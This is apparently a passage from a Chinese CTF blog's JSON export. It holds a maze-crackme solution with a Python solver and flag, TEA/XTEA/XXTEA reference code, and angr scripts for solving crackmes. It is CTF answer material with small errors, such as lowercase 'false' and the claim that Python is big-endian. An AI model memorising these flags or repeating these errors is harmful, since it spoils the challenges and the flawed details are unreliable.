&#x27;l&#x27;: ++v4; break; default: goto LABEL_12; &#125; v17 = v4;LABEL_12: //判断条件 if ( v5 &lt; 0 || v4 &lt; 0 || v5 &gt;= 21 || v4 &gt;= 21 || (v5 ^ (v4 &lt;&lt; 8) ^ dword_4043C8[v3 + v4] ^ (unsigned __int8)byte_404208[v3 + v4]) != 1 ) &#123; exit(-1); &#125; v10 = ++v1; v7 = strlen(v2); v3 = v16; v2 = input; if ( v1 &gt;= v7 ) goto LABEL_21; &#125;&#125; 这显然是一个迷宫。Label12是判断条件，Label21的if满足以后，就可以真正得到flag。 先满足Label21的if: 123456for v7 in range(22): v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF) v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF) if v9 == 0x618ff339: print(v7)#20 迷宫出口是20，20。判断的条件Label12是位置和两个数组的异或，网上找了一段大佬的走迷宫算法改一下，便可以求出来flag。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071dirs=[(0,1),(1,0),(0,-1),(-1,0)] #当前位置四个方向的偏移量path=[] #存找到的路径 def mark(maze,pos): #给迷宫maze的位置pos标&quot;-1&quot;表示“到过了” maze[pos[0]][pos[1]]=-1 def passable(maze,pos): #检查迷宫maze的位置pos是否可通行 if (pos[0] &gt;= 21 or pos[0] &lt; 0 or pos[1] &gt;= 21 or pos[1] &lt; 0): return false return maze[pos[0]][pos[1]] ^ pos[0] ^ (pos[1] &lt;&lt; 8) == 1 def find_path(maze,pos,end): mark(maze,pos) if pos==end: print(pos,end=&quot; &quot;) #已到达出口，输出这个位置。成功结束 path.append(pos) return True for i in range(4): #否则按四个方向顺序检查 nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1] #考虑下一个可能方向 if passable(maze,nextp): #不可行的相邻位置不管 if find_path(maze,nextp,end):#如果从nextp可达出口，输出这个位置，成功结束 print(pos,end=&quot; &quot;) path.append(pos) return True return False def see_path(maze,path): #使寻找到的路径可视化 for i,p in enumerate(path): if i==0: maze[p[0]][p[1]] =&quot;E&quot; elif i==len(path)-1: maze[p[0]][p[1]]=&quot;S&quot; else: maze[p[0]][p[1]] =-2 print(&quot;\\n&quot;) flag = &quot;&quot; for i in range(len(path) - 1): dx = path[i + 1][0] - path[i][0] //后状态减去前状态。 dy = path[i + 1][1] - path[i][1] if dx == 1: flag += &quot;h&quot; if dx == -1: flag += &quot;j&quot; if dy == -1: flag += &quot;l&quot; if dy == 1: flag += &quot;k&quot; print(flag[::-1])if __name__ == &#x27;__main__&#x27;: byte_404208 = [0x45, 0x24, 0xBD, 0x3E, 0x32, 0x9D, 0x8F, 0x53, 0xCC, 0x4F, 0x8D, 0x2C, 0x7C, 0xF2, 0xBA, 0x30, 0x0D, 0xC7, 0x57, 0x19, 0x91, 0xF4, 0xE6, 0x28, 0x4F, 0xEE, 0x47, 0x7C, 0xD8, 0xF8, 0xD8, 0x79, 0xD1, 0x7A, 0x32, 0x82, 0xD9, 0xDF, 0x20, 0xD6, 0xEF, 0x5E, 0x24, 0x6E, 0x67, 0xB4, 0x9D, 0x49, 0xCA, 0xDD, 0x64, 0x9D, 0x0E, 0x2F, 0x0E, 0xBD, 0x1B, 0x81, 0xF3, 0x6B, 0x5F, 0xA1, 0xAC, 0x0E, 0x66, 0x76, 0x3F, 0xBF, 0x80, 0x94, 0x86, 0x44, 0xA9, 0xB8, 0xB8, 0xFE, 0xB5, 0x1A, 0x94, 0x6F, 0x3B, 0x64, 0xF6, 0x82, 0x76, 0x0A, 0x28, 0xAB, 0x8D, 0xB7, 0xB7, 0xC1, 0x0F, 0x1A, 0x3A, 0xFC, 0x77, 0x71, 0xE6, 0x5F, 0x3C, 0x9F, 0xEC, 0x3A, 0x83, 0xAF, 0x32, 0x9D, 0x43, 0xD6, 0xD0, 0x9B, 0x14, 0xBD, 0x78, 0xDC, 0xD6, 0xC2, 0x1D, 0x54, 0xB3, 0xCE, 0xF8, 0x71, 0x92, 0x44, 0x85, 0xA2, 0x58, 0xEF, 0x80, 0x2F, 0xF0, 0x90, 0xF4, 0xAB, 0xDB, 0x63, 0x74, 0xE1, 0xBB, 0xCA, 0xC5, 0xAC, 0x39, 0xA7, 0x56, 0x45, 0x25, 0xAA, 0xCA, 0x2A, 0x30, 0x95, 0xDC, 0x17, 0x31, 0x4F, 0x62, 0x39, 0xA4, 0x1C, 0x93, 0xE1, 0xA9, 0x2F, 0xB3, 0x4F, 0x26, 0x53, 0x47, 0x23, 0xDB, 0x34, 0xDE, 0xC1, 0x27, 0x5F, 0xEB, 0x2E, 0x91, 0x5E, 0xCA, 0xCB, 0xD6, 0x11, 0xA3, 0x8F, 0x47, 0xDD, 0xC0, 0xFB, 0xEE, 0xCF, 0xC9, 0xCA, 0xD9, 0xF8, 0xB9, 0x15, 0x34, 0x23, 0x6B, 0x6D, 0x28, 0xF6, 0xE2, 0x1E, 0xF8, 0xFF, 0xEB, 0xFB, 0xE9, 0x70, 0x5C, 0xD4, 0xED, 0x78, 0xD4, 0x7A, 0x22, 0x1C, 0x69, 0xF1, 0x39, 0x61, 0xC2, 0xB9, 0x7B, 0xF3, 0xC2, 0xA2, 0x99, 0x64, 0x48, 0xAC, 0x38, 0x55, 0x0C, 0xB3, 0x0B, 0xD6, 0x9B, 0x46, 0x70, 0x8B, 0xCD, 0x0F, 0x87, 0xCB, 0x7F, 0xE0, 0xAB, 0x4A, 0xCB, 0x79, 0x43, 0xE2, 0x60, 0x15, 0x0A, 0x7C, 0x0A, 0xD9, 0x15, 0x41, 0xF3, 0x2C, 0x2C, 0x61, 0x14, 0xC1, 0x43, 0xA5, 0x1A, 0xC7, 0x33, 0xC9, 0x89, 0xB7, 0x37, 0xC4, 0x57, 0x81, 0x23, 0xCA, 0xD4, 0xF1, 0x7E, 0xF4, 0x65, 0x8D, 0x72, 0x6B, 0xA4, 0x9A, 0xEE, 0xAC, 0xBA, 0x71, 0x4E, 0xDE, 0x6A, 0x88, 0x36, 0x1D, 0x72, 0xB1, 0xF0, 0x9B, 0x69, 0x19, 0xB0, 0x7C, 0xEA, 0xF7, 0x51, 0x62, 0xD1, 0x3A, 0x67, 0x56, 0x66, 0xBA, 0x79, 0x59, 0x66, 0xB1, 0xC5, 0x8F, 0xE9, 0x6C, 0x99, 0x3C, 0xF0, 0x89, 0xF6, 0xBF, 0x15, 0x61, 0x92, 0xE0, 0x60, 0x3E, 0x59, 0x35, 0x4B, 0x1F, 0x6F, 0x65, 0xE4, 0x71, 0x0D, 0x7B, 0x6E, 0x93, 0x14, 0x5D, 0x4C, 0x6F, 0x2F, 0x52, 0xA6, 0x5D, 0x90, 0x7B, 0xCC, 0xE1, 0x69, 0x77, 0x7E, 0x8D, 0x33, 0x6B, 0x37, 0xC4, 0x2F, 0xBF, 0x6F, 0xBF, 0xA8, 0xB3, 0x61, 0x5C, 0xD2, 0xC2, 0x2D, 0xC8, 0xF4, 0xBB, 0xB2, 0xD0, 0x22, 0x9C, 0x75, 0xDF, 0x59, 0x72, 0xAA, 0xFD, 0x7E, 0x67, 0x2E, 0x61, 0xBA, 0x6B, 0x4B, 0x19, 0xA6, 0xD5, 0x11, 0x15, 0xBC, 0x91, 0xEB, 0x42, 0xCC, 0x72, 0xB2, 0xC6, 0x47, 0xA3, 0xCC, 0xAC, 0x6C, 0xA8, 0xD8, 0xCA, 0xD2, 0x84, 0x2B, 0x35, 0xAB, 0xAF, 0xC8, 0xA5, 0x2F, 0x7F, 0x7F, 0xF5, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] dword_4043C8 = [0x00000044, 0x00000124, 0x000002BD, 0x0000033E, 0x00000432, 0x0000059D, 0x0000068F, 0x00000753, 0x000008CC, 0x0000094F, 0x00000A8D, 0x00000B2C, 0x00000C7C, 0x00000DF2, 0x00000EBA, 0x00000F30, 0x0000100D, 0x000011C7, 0x00001257, 0x00001319, 0x00001491, 0x000000F4, 0x000001E7, 0x00000229, 0x0000034F, 0x000004EE, 0x00000547, 0x0000067C, 0x000007D8, 0x000008F8, 0x000009D8, 0x00000A79, 0x00000BD1, 0x00000C7A, 0x00000D32, 0x00000E82, 0x00000FD9, 0x000010DF, 0x00001120, 0x000012D6, 0x000013EE, 0x0000145F, 0x00000027, 0x0000016C, 0x00000265, 0x000003B7, 0x0000049F, 0x0000054B, 0x000006C8, 0x000007DF, 0x00000866, 0x0000099F, 0x00000A0C, 0x00000B2D, 0x00000C0C, 0x00000DBF, 0x00000E19, 0x00000F83, 0x000010F1, 0x00001169, 0x0000125C, 0x000013A3, 0x000014AE, 0x0000000C, 0x00000164, 0x00000274, 0x0000033D, 0x000004BD, 0x00000582, 0x00000696, 0x00000784, 0x00000846, 0x000009AB, 0x00000ABA, 0x00000BBA, 0x00000CFC, 0x00000DB7, 0x00000E18, 0x00000F96, 0x0000106C, 0x00001138, 0x00001267, 0x000013F5, 0x00001481, 0x00000072, 0x0000010E, 0x0000022C, 0x000003AF, 0x00000489, 0x000005B3, 0x000006B3, 0x000007C5, 0x0000080B, 0x0000091E, 0x00000A3E, 0x00000BF8, 0x00000C73, 0x00000D75, 0x00000EE2, 0x00000F5A, 0x00001038, 0x0000119A, 0x000012E9, 0x0000133F, 0x00001487, 0x000000AA, 0x00000137, 0x00000298, 0x00000346, 0x000004D3, 0x000005D5, 0x0000069E, 0x00000711, 0x000008B8, 0x0000097D, 0x00000AD9, 0x00000BD3, 0x00000CC7, 0x00000D18, 0x00000E51, 0x00000FB7, 0x000010CB, 0x000011FC, 0x00001274, 0x00001396, 0x00001441, 0x00000082, 0x000001A5, 0x0000025F, 0x000003E8, 0x00000487, 0x00000528, 0x000006F7, 0x00000797, 0x000008F3, 0x000009AC, 0x00000ADC, 0x00000B65, 0x00000C73, 0x00000DE6, 0x00000EBC, 0x00000FCD, 0x000010C3, 0x000011AB, 0x0000123F, 0x000013A0, 0x00001450, 0x00000043, 0x00000122, 0x000002AD, 0x000003CD, 0x0000042D, 0x00000537, 0x00000692, 0x000007DB, 0x00000810, 0x00000936, 0x00000A49, 0x00000B65, 0x00000C3E, 0x00000DA3, 0x00000E1B, 0x00000F95, 0x000010E6, 0x000011AF, 0x00001228, 0x000013B5, 0x00001448, 0x0000002F, 0x0000015B, 0x0000024E, 0x0000032A, 0x000004D2, 0x0000053C, 0x000006D6, 0x000007C9, 0x0000082F, 0x00000957, 0x00000AE2, 0x00000B26, 0x00000C98, 0x00000D57, 0x00000EC3, 0x00000FC2, 0x000010DE, 0x00001118, 0x000012AB, 0x00001386, 0x0000144F, 0x000000D5, 0x000001C9, 0x000002F3, 0x000003E7, 0x000004C6, 0x000005C0, 0x000006C2, 0x000007D1, 0x000008F0, 0x000009B0, 0x00000A1D, 0x00000B3D, 0x00000C2A, 0x00000D62, 0x00000E64, 0x00000F20, 0x000010FF, 0x000011EA, 0x00001217, 0x000013F0, 0x000014F6, 0x000000E0, 0x000001F0, 0x000002E2, 0x0000037B, 0x00000456, 0x000005DE, 0x000006E6, 0x00000772, 0x000008DF, 0x00000970, 0x00000A29, 0x00000B16, 0x00000C62, 0x00000DFB, 0x00000E33, 0x00000F6A, 0x000010C8, 0x000011B2, 0x00001271, 0x000013F8, 0x000014C8, 0x000000A9, 0x00000192, 0x0000026F, 0x00000342, 0x000004A7, 0x00000533, 0x0000065F, 0x00000707, 0x000008B9, 0x00000900, 0x00000ADC, 0x00000B90, 0x00000C4C, 0x00000D7B, 0x00000E81, 0x00000FC7, 0x00001004, 0x0000118D, 0x000012C0, 0x00001375, 0x000014EB, 0x000000A7, 0x00000147, 0x000002C6, 0x00000374, 0x0000044F, 0x000005EE, 0x0000066D, 0x00000719, 0x00000807, 0x00000970, 0x00000A07, 0x00000BD5, 0x00000C18, 0x00000D4D, 0x00000EFE, 0x00000F20, 0x00001021, 0x0000116C, 0x00001218, 0x000013CC, 0x0000144F, 0x000000A8, 0x00000117, 0x000002CA, 0x0000033F, 0x000004C5, 0x00000585, 0x000006BB, 0x0000073A, 0x000008C8, 0x0000095A, 0x00000A8D, 0x00000B2F, 0x00000CC6, 0x00000DD8, 0x00000EFD, 0x00000F73, 0x000010F8, 0x00001168, 0x00001280, 0x0000137E, 0x00001466, 0x000000AA, 0x00000194, 0x000002E0, 0x000003A2, 0x000004B4, 0x0000057F, 0x00000640, 0x000007D0, 0x00000865, 0x00000986, 0x00000A38, 0x00000B13, 0x00000C7C, 0x00000DBF, 0x00000EFE, 0x00000F95, 0x00001066, 0x00001117, 0x000012BE, 0x00001373, 0x000014E4, 0x000000F9, 0x0000015F, 0x0000026C, 0x000003DF, 0x00000434, 0x00000569, 0x00000658, 0x00000768, 0x000008B4, 0x00000976, 0x00000A56, 0x00000B68, 0x00000CBF, 0x00000DCB, 0x00000E81, 0x00000FE7, 0x00001062, 0x00001196, 0x00001233, 0x000013FE, 0x00001486, 0x000000E7, 0x000001AF, 0x00000205, 0x00000371, 0x00000482, 0x000005F0, 0x00000670, 0x0000072E, 0x00000849, 0x00000925, 0x00000A5B, 0x00000B0E, 0x00000C7F, 0x00000D75, 0x00000EF4, 0x00000F61, 0x0000101D, 0x0000116B, 0x0000127E, 0x00001382, 0x00001404, 0x0000004D, 0x0000015C, 0x0000027F, 0x0000033F, 0x00000442, 0x000005B6, 0x0000064D, 0x00000780, 0x0000086B, 0x000009DC, 0x00000AF1, 0x00000B79, 0x00000C66, 0x00000D6E, 0x00000E9D, 0x00000F23, 0x0000107B, 0x00001126, 0x000012D5, 0x0000133F, 0x000014AE, 0x0000007D, 0x000001AD, 0x000002BB, 0x000003A1, 0x00000473, 0x0000054E, 0x000006C0, 0x000007D0, 0x0000083F, 0x000009DA, 0x00000AE6, 0x00000BA9, 0x00000CA0, 0x00000DC3, 0x00000E30, 0x00000F8E, 0x00001066, 0x000011CD, 0x0000124B, 0x00001361, 0x000014B8, 0x000000EE, 0x0000016D, 0x00000275, 0x0000033C, 0x00000473, 0x000005A8, 0x00000679, 0x00000759, 0x0000080B, 0x000009B4, 0x00000AC7, 0x00000B03, 0x00000C07, 0x00000DAE, 0x00000E82, 0x00000FF8, 0x00001050, 0x000011DF, 0x00001261, 0x000013A0, 0x000014D5, 0x00000053, 0x000001B7, 0x000002D8, 0x000003B8, 0x00000478, 0x000005BC, 0x000006CC, 0x000007DE, 0x000008C6, 0x00000990, 0x00000A3F, 0x00000B21, 0x00000CBF, 0x00000DBB, 0x00000EDC, 0x00000FB1, 0x0000103B, 0x0000116B, 0x0000126B, 0x000013E0, 0x00001434] tmp = [] for i in range(441): tmp.append(dword_4043C8[i] ^ byte_404208[i]) maze = [] for i in range(21): for i in range(21): print(tmp[i * 21 + 0 : i * 21 + 21]) maze.append(tmp[i * 21 + 0 : i * 21 + 21]) start=(0,0) end=(20,20) find_path(maze,start,end) see_path(maze,path)#jjjllllllllllllllljjjjjjjjkjjkkkkhhhhhhhkkkkkkkkkkjjjjllljjjlllhhhhlljjjjjjkkkkkkkkjjlllllllllllhhlllllhhhlhhhhhhhhlljjjjjjjjjjjjjjjjl 最终结果： 1661451301787 总结 这道题确实超出我能力范围，还需要接着努力。长城杯这道题做出来的人，高校组差不多有十个左右？政企组就只有两个，如果这个题做出来了，应该可以去线下了吧。不过这一年的努力没有白费，希望网鼎杯能出好成绩。关于try except中，SEH反调试优先交给调试器这个我有个印象，之前听大佬们讲直播讲课有提及。hed10ne大佬留了一篇反调试佳作：反调试技术整理","categories":[{"name":"match","slug":"match","permalink":"https://feverhu.github.io/categories/match/"}],"tags":[{"name":"异常处理","slug":"异常处理","permalink":"https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}]},{"title":"TEA学习","slug":"TEA学习","date":"2022-08-07T02:04:53.000Z","updated":"2022-09-16T13:00:08.801Z","comments":true,"path":"2022/08/07/TEA学习/","link":"","permalink":"https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"TEA 感谢各位师傅，转载连接：https://www.cnblogs.com/sk2rw/p/14797633.html 我做做删减和补充。 简介 TEA算法使用64位的明文分组和128位的密钥，使用feistel分组加框架，需要进行32轮循环得到最后的64位密文，其中magic number DELTA是由黄金分割点。 tea算法最关键的是要找到DELTA值和128位的key。 在逆向程序的时候，可以利用ida的插件findcypto识别tea算法。 如上图的程序，可以看出a2就是key，v4-=0x61c88647和v4+=0x9e3779b9是等价的，显然DELTA就是0x9e3779b9 Tea算法还可以进行魔改，魔改的地方主要是DELTA值，将这个值修改会让很多加密算法识别软件失效，像下面的程序就将DELTA魔改为0x1234567，绕过来peid的插件KANAL的识别。 补充TEA及魔改TEA加密与解密源码： 初级TEA 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; //加密函数void encrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;//解密函数void decrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++) &#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; int main()&#123; uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); encrypt(v, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); decrypt(v, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0;&#125; TEA升级版XTEA 增加了更多的密钥表，移位和异或等操作。 XTEA是TEA的扩展，也称做TEAN，它使用与TEA相同的简单运算，同样是一个64位块的Feistel密码，使用128位密钥，建议64轮, 但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758加密前原始数据：1 2 加密后的数据：1347371722 925494771 解密后的数据：1 2 Process returned 0 (0x0) execution time : 0.020 s Press any key to continue. XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler加密过程：算法实现：示例代码：[cpp] view plain copy#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1; &#125; void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1; &#125; int main() &#123; uint32_t v[2]=&#123;1,2&#125;; uint32_t const k[4]=&#123;2,2,3,4&#125;; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); encipher(r, v, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); decipher(r, v, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0; &#125; XXTEA 又称Corrected Block TEA，是XTEA的升级版 XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x9e3779b9 #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) &#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ &#123; rounds = 6 + 52/n; sum = 0; z = v[n-1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) &#123; y = v[p+1]; z = v[p] += MX; &#125; y = v[0]; z = v[n-1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) /* Decoding Part */ &#123; n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125; &#125; int main() &#123; uint32_t v[2]= &#123;1,2&#125;; uint32_t const k[4]= &#123;2,2,3,4&#125;; int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); btea(v, n, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); btea(v, -n, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0; &#125; 注意！ python是大端序， 我们的C语言是小端序。所以需要转化一下。例如： 12345python:b&#x27;\\xbc\\xa5\\xce@\\xf4\\xb2\\xb2\\xe7\\xa9\\x12\\x9d\\x12\\xae\\x10\\xc8[=\\xd7\\x06\\x1d\\xdcp\\xf8\\xdc&#x27;c++:uint32_t v[6]= &#123;0x40cea5bc,0xe7b2b2f4,0x129d12a9,0x5bc810ae,0x1d06d73d,0xdcf870dc&#125;; &quot;flag&quot; 0x67616c66","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://feverhu.github.io/categories/Reverse/"}],"tags":[{"name":"TEA","slug":"TEA","permalink":"https://feverhu.github.io/tags/TEA/"}]},{"title":"angr学习","slug":"angr学习","date":"2022-08-07T01:16:54.000Z","updated":"2022-09-16T12:59:53.722Z","comments":true,"path":"2022/08/07/angr学习/","link":"","permalink":"https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"angr学习 angr基本脚本 一、非命令行输入 1234567891011121314151617181920212223242526import angrimport sysdef Go(): path_to_binary = &quot;*****&quot; project = angr.Project(path_to_binary, auto_load_libs=False) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000 #print(project.entry) print_good_address = 0x4009E7 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入 print(solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &quot;__main__&quot;: Go() #path_to_binary = &quot;oruga&quot; #project = angr.Project(path_to_binary, auto_load_libs=False) #print(project.entry) 二、使用命令行参数情况 12345678910111213141516171819202122232425import angrimport sysimport claripydef Go(): path_to_binary = &quot;chall&quot; project = angr.Project(path_to_binary, auto_load_libs=False) #print(project.entry) argv1 = claripy.BVS(&#x27;argv1&#x27;,33*8) initial_state = project.factory.entry_state(args=[&quot;./chall&quot;, argv1]) simulation = project.factory.simgr(initial_state) print_good_address = 0x400817 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0].solver.eval(argv1) # 打印结果 solution = solution_state.to_bytes(33,&quot;big&quot;) print(solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &quot;__main__&quot;: Go() 代替scanf： 123456789101112131415161718192021222324252627282930313233343536373839import angrimport sysimport claripydef main(argv): path_to_binary = &#x27;ROR.exe&#x27; # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, param0): scanf0 = claripy.BVS(&#x27;scanf0&#x27;, 8 * 80) scanf0_address = param0 print(scanf0_address) self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness) self.state.globals[&#x27;solutions&#x27;] = scanf0 scanf_symbol = &#x27;scanf&#x27; project.hook_symbol(scanf_symbol, ReplacementScanf()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return &#x27;Congratulations&#x27;.encode() in stdout_output simulation.explore(find=is_successful) if simulation.found: solution_state = simulation.found[0] stored_solutions = solution_state.globals[&#x27;solutions&#x27;] scanf0_solution = solution_state.solver.eval(stored_solutions) print(scanf0_solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &#x27;__main__&#x27;: main(sys.argv) angr练习十八道 02_angr_find_condition 本题知识点：在没有地址情况下，利用字符串来确定寻找地址和规避地址。 ida： 12345678910111213def is_successful(state): # Dump whatever has been printed out by the binary so far into a string. stdout_output = state.posix.dumps(sys.stdout.fileno()) # Return whether &#x27;Good Job.&#x27; has been printed yet. # (!) return b&#x27;Good Job.&#x27; in stdout_output # :booleandef should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b&#x27;Try again.&#x27; in stdout_output # :booleansimulation.explore(find=is_successful, avoid=should_abort) 通过 stdout_output = state.posix.dumps(sys.stdout.fileno())和return b'Good Job.' in stdout_output # :boolean来判断是否到底指定情况的地址，适用于多种情况而非一个地址的情况。","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://feverhu.github.io/categories/Reverse/"}],"tags":[{"name":"angr","slug":"angr","permalink":"https://feverhu.github.io/tags/angr/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-07-31T06:56:59.204Z","updated":"2022-08-07T02:22:07.305Z","comments":true,"path":"2022/07/31/hello-world/","link":"","permalink":"https://feverhu.github.io/2022/07/31/hello-world/","excerpt":"","text":"感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^ Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new &quot;My New Post&quot; More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[{"name":"tags","slug":"tags","permalink":"https://feverhu.github.io/tags/tags/"}]}],"categories":[{"name":"match","slug":"match","permalink":"https://feverhu.github.io/categories/match/"},{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"},{"name":"Reverse","slug":"Reverse","permalink":"https://feverhu.github.io/categories/Reverse/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"php","slug":"php","permalink":"https://feverhu.github.io/tags/php/"},{"name":"python","slug":"python","permalink":"https://feverhu.github.io/tags/python/"},{"name":"NTRU","slug":"NTRU","permalink":"https://feverhu.github.io/tags/NTRU/"},{"name":"LCG","slug":"LCG","permalink":"https://feverhu.github.io/tags/LCG/"},{"name":"NTURE","slug":"NTURE","permalink":"https://feverhu.github.io/tags/NTURE/"},{"name":"异常处理","slug":"异常处理","permalink":"https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"TEA","slug":"TEA","permalink":"https://feverhu.github.io/tags/TEA/"},{"name":"angr","slug":"angr","permalink":"https://feverhu.github.io/tags/angr/"},{"name":"tags","slug":"tags","permalink":"https://feverhu.github.io/tags/tags/"}]}